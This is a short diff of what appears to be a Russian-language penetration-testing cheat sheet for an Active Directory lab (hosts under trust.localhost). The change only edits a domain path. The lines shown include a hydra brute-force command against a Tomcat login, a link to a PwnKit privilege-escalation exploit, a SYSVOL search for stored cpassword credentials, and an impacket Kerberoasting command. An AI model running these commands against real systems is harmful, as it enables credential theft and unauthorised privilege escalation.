@@ -67,7 +67,7 @@ hydra -L tomcat_user.txt -P tomcat_pass.txt -f alic.trust.localhost -s 7012 http
 ## Повышение привилегий
 **Linux** pwnkit --  https://github.com/PwnFunction/CVE-2021-4034 
 **AD** 
-```findstr /S /I cpassword \\domain.trust.localhost\sysvol\vesta.ru\policies\*.xml```
+```findstr /S /I cpassword \\domain.trust.localhost\sysvol\vestik\policies\*.xml```
 **AD** 
 ```
 python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 172.16.1.1 trust.localhost/ptuser -request
